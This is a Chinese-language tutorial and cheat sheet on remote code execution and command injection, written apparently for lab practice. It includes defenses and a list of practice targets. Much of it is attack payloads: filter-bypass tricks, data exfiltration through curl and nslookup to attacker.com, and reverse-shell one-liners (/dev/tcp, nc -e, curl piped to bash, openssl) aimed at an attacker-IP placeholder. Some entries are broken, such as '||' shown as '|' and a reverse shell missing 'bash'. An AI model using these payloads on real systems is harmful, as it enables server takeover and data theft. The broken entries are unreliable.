

### 一、漏洞定义与核心概念

#### 1.1 定义

**RCE（Remote Code Execution，远程代码执行）** 指攻击者通过 Web 应用的安全漏洞，在目标服务器上**远程执行任意系统命令或代码**的安全漏洞。这是 Web 安全领域**危害等级最高的漏洞类型之一**。

#### 1.2 核心分类

|类别|技术实现|典型函数|危害|
|---|---|---|---|
|**命令执行**|执行操作系统命令|`system()`, `exec()`, `shell_exec()`, `passthru()`|直接控制服务器|
|**代码执行**|执行脚本代码|`eval()`, `assert()`, `preg_replace(/e/)`|控制应用逻辑|
|**表达式注入**|表达式引擎注入|OGNL、SpEL、MVEL|框架级 RCE|

> **命令执行**通常是代码执行的结果，但 RCE 一般特指命令执行，因为拿到 Shell 权限才算真正控制服务器。

### 二、漏洞成因与产生条件

#### 2.1 根本原因

**用户输入未经验证直接传入系统命令执行函数**

#### 2.2 产生条件（三个必要条件）

```text
条件1：应用调用了系统命令执行函数
    ↓
条件2：用户输入可控制命令参数
    ↓
条件3：输入未经过滤/转义
    ↓
结果：RCE 漏洞产生
```

#### 2.3 危险函数速查表

| 语言          | 危险函数                                                                                               | 说明                   |
| ----------- | -------------------------------------------------------------------------------------------------- | -------------------- |
| **PHP**     | `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, `proc_open()`, `eval()`, `assert()` | 最常出现 RCE 的语言         |
| **Python**  | `os.system()`, `os.popen()`, `subprocess.Popen()`, `eval()`, `exec()`                              | 常见于 Web 框架           |
| **Java**    | `Runtime.exec()`, `ProcessBuilder`                                                                 | 常见于 Weblogic、Struts2 |
| **Node.js** | `child_process.exec()`, `child_process.spawn()`, `eval()`                                          | 常见于 npm 生态           |
| **Go**      | `os/exec` 包                                                                                        | 常见于容器环境              |

### 三、命令注入手法（攻击者视角）

#### 3.1 命令连接符（注入关键武器）

|符号|作用|示例|使用场景|
|---|---|---|---|
|`;`|顺序执行多条命令|`ping 8.8.8.8; whoami`|最常用，通用性高|
|`&&`|前一条成功才执行后一条|`ping 127.0.0.1 && whoami`|避免执行失败的干扰|
|`\|`|前一条失败才执行后一条|`ping 127.0.0.1 \| whoami`|绕过基于错误的过滤|
|`\|`|管道，前命令输出作为后命令输入|`whoami \| base64`|需要传递输出时使用|
|`&`|后台执行（Windows 优先）|`ping 8.8.8.8 & whoami`|Windows 环境|
|`` ` `` \| 命令替换（反引号） \| `` `whoami` `` \| 嵌入到字符串中 \|||||
|`$()`|命令替换|`$(whoami)`|优先于反引号，可嵌套|

> **URL 编码注意**：`;` → `%3B`，`&` → `%26`，`|` → `%7C`，空格 → `%20` 或 `+`，`#` → `%23`

#### 3.2 绕过限制技巧

|绕过方式|技术原理|示例|
|---|---|---|
|**空格绕过**|使用其他字符替代空格|`cat${IFS}/etc/passwd`（Linux）  <br>`cat</etc/passwd`|
|**黑名单绕过**|使用通配符或编码|`cat /etc/pass` → `cat /e?c/p??s?d`|
|**编码绕过**|利用 Base64/Hex 执行|`echo whoami \| base64 -d \| bash`  <br>`$(printf "whoami" \| base64 -d)`|
|**拼接绕过**|利用环境变量或字符串拼接|`w` + `h` + `oami`  <br>`` `a=w;b=hoami;$a$b` ``|
|**换行绕过**|使用换行符分割命令|`127.0.0.1%0awhoami`|
|**Tab 绕过**|使用制表符替代空格|`127.0.0.1%09whoami`|
|**大/小写转换**|利用大小写不敏感的环境|`127.0.0.1; WhOaMi`（Windows 环境）|

### 四、RCE 漏洞分类与检测方法

#### 4.1 按触发方式分类

|类型|触发条件|常见场景|
|---|---|---|
|**主动型 RCE**|攻击者直接提交恶意输入|URL 参数、表单输入、HTTP Header|
|**被动型 RCE**|需要目标用户访问恶意链接|文件包含、SSRF 导致命令执行|

#### 4.2 检测方法（三步走）

```text
1. 注入测试
   ├── 基础探测：127.0.0.1; whoami
   ├── 观察响应：whoami 命令是否返回用户名
   └── 判断执行：如有回显，直接验证
2. 盲测（无回显场景）
   ├── 延时判断：sleep 5、ping 127.0.0.1 -n 5
   ├── 外带数据：curl、wget 带参数请求外部服务器
   └── 写入文件：echo test > /tmp/test.txt
3. 信息收集
   ├── 确认环境：uname -a、ipconfig
   ├── 确认用户：whoami、id
   └── 确认权限：sudo -l、cat /etc/passwd
```

### 五、利用方式（攻击者视角）

#### 5.1 有回显场景

直接注入 `whoami`、`id`、`ls` 等命令查看响应。

```bash

# Linux 环境
127.0.0.1; whoami
127.0.0.1; id
127.0.0.1; ls -la
# Windows 环境
127.0.0.1& whoami
127.0.0.1& ipconfig
127.0.0.1& dir C:\
```

#### 5.2 无回显场景（盲打）

|方法|技术原理|示例|
|---|---|---|
|**DNS 外带**|利用 DNS 查询外带数据|`nslookup whoami.attacker.com`|
|**HTTP 外带**|利用 HTTP 请求外带数据|`curl http://attacker.com/$(whoami)`|
|**延时判断**|利用 SLEEP 命令判断|`ping -c 5 127.0.0.1`（延时 5 秒）|
|**写入文件**|将输出写到 Web 可访问目录|`whoami > /var/www/html/out.txt`|

#### 5.3 反弹 Shell（最终目标）

```bash
# Linux 反弹 Shell
bash -i >& /dev/tcp/攻击者IP/端口 0>&1
curl http://攻击者IP/shell.sh | bash
# nc 反弹（Linux）
nc -e /bin/sh 攻击者IP 端口
# 加密反弹（绕过流量检测）
openssl s_client -connect 攻击者IP:端口 -quiet | /bin/sh
```

**反弹 Shell 检测表：**

|技术|适用场景|优缺点|
|---|---|---|
|`/dev/tcp`|有 `/dev/tcp` 的 Linux 环境|无依赖，需 Bash 支持|
|`nc`|有 netcat 的环境|速度快，部分系统无 `-e` 参数|
|`curl` + 脚本|有 curl 的环境|需外网服务器托管脚本|
|Python|有 Python 环境|跨平台，资源消耗大|
|OpenSSL|需要加密的场景|可绕过流量检测|

### 六、防御方案

|防御层级|实现方式|防护效果|
|---|---|---|
|**输入过滤**|使用白名单过滤特殊字符（`;` `&` `\|` 等）|基础防护|
|**参数化**|避免直接拼接，使用安全的 API|最佳实践|
|**最小权限**|限制 Web 进程权限（非 root 运行）|限制攻击影响范围|
|**禁用危险函数**|在 `php.ini` 中禁用 `system`、`exec` 等函数|默认安全|
|**应用层防护**|使用 WAF 拦截常见 Payload|辅助防护|
|**日志审计**|记录所有命令执行操作|事后回溯|

### 七、靶场练习清单

|靶场|关卡|技术点|
|---|---|---|
|**Pikachu**|RCE - exec "ping"|基础命令注入|
|**Pikachu**|RCE - exec "eval"|代码执行（PHP）|
|**DVWA**|Command Injection（Low/Medium/High）|渐进式防御绕过|
|**VulHub**|CVE-2017-12615（Tomcat PUT）|文件上传触发 RCE|
|**VulHub**|S2-045（Struts2）|框架级 RCE|
|**VulHub**|Log4j2（CVE-2021-44228）|JNDI 注入 RCE|

### 八、RCE 攻击完整流程图
![[deepseek_mermaid_20260625_a1c481.png]]
### 九、快速测试备忘录

```markdown
graph TD
    A[发现输入点] --> B{测试注入}
    B -->|有回显| C[直接执行命令]
    B -->|无回显| D[盲测]
    C --> E[信息收集]
    D --> F[延时/外带/写文件]
    F --> E
    E --> G[权限提升]
    G --> H[反弹 Shell]
    H --> I[拿到服务器控制权]
```

# 最简单的测试 Payload（适用于有回显）
```bash
127.0.0.1; whoami
```
# 无回显环境盲测
```bash
127.0.0.1; ping -c 5 127.0.0.1   # Linux
127.0.0.1& ping -n 5 127.0.0.1   # Windows
```
# 信息收集（记得替换为自己的攻击机IP）
```bash
127.0.0.1; whoami > /var/www/html/out.txt   # 写文件到 web 目录
127.0.0.1; curl http://你的IP/$(whoami)     # HTTP 外带
```
# 一句话反弹 Shell
```bash
-i >& /dev/tcp/你的IP/端口 0>&1
```

### 十、一句话总结

> **RCE 的本质是用户输入未被过滤便传入系统命令执行函数。防御的关键在于：永远不要信任用户输入，永远不要在代码里直接拼接命令。**